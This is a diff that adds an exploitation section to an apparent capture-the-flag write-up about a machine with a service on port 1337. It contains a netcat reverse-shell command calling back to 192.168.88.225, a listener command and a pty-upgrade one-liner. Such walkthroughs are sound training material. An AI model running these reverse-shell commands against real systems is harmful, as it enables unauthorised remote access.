@@ -68,6 +68,45 @@ The main vulnerability is this. But i don't know about backend of 1337 port. May
 
 ## Exploitation
 
+### Token
+
+[Script to create a token](token.py)
+
+Successfully got access with 'lower' credentials.
+
+![access](screenshots/1337_access.png)
+
+But we don't have shell yet.
+
+### Shell
+
+Get shell is easy:
+
+Local:
+```
+nc -lnvp 4444
+```
+Target:
+```
+nc 192.168.88.225 4444 -c /bin/sh
+```
+So, after target connected to us, it will open a shell.
+
+![shell](screenshots/shell.png)
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+User - `www-data`.
+
+### ssh flagman
+
+In flagman home directory:
+
+![warzone](screenshots/warzone.png)
+
+Now we have a good shell and ssh access.
+
 ## Post exploitation
 
 ## Sources
